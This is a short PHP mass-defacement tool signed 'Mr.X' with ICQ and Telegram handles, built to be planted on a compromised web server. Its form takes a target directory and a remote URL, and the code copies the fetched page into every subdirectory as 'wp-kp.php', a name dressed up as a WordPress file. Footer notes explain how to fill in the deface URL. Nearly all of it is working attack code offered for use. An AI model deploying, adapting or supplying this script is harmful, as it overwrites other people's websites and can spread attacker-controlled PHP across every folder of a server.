<?php
echo "<center><textarea rows='10' cols='100'>";
$defaceurl = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
echo $dir."\n";
 
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
                        if(filetype($dir.$file)=="dir"){
                                $newfile=$dir.$file."/wp-kp.php";
                                echo $newfile."\n";
                                if (!copy($defaceurl, $newfile)) {
                                        echo "failed to copy $file...\n";
                                }
                        }
        }
        closedir($dh);
    }
}
echo "</textarea></center>";
?>
<div class="bg-dark border text-center mt-2"><small> <h1><center><font color="black">&gt; ! Mr<font color="red"> X &lt;</center></H1></font>
<font color="red">  </small></div>
<div class="bg-dark border text-center mt-2"><small>Mr.X ICQ ID:@Sidhelchor|TELIGRAM ID :@jackleet</small></div>
<td align=right>Mass Defacement:</td><br>
<form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
[+] Main Directory: <input type='text' style='width: 250px' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'>
[+] Defacement Url: <input type='text' style='width: 250px' name='massdefaceurl'>
<input type='submit' name='execmassdeface' value='Execute'></form></td>
 
 

<br><br><br>
** Main Directory = The Directory you want to mass deface (Must have read/write permission) **<br>
** Defacement Url = URL of your deface page (e.g: http://yoursite.com/deface.html ) **<br><br>
By MR.X
</body></html>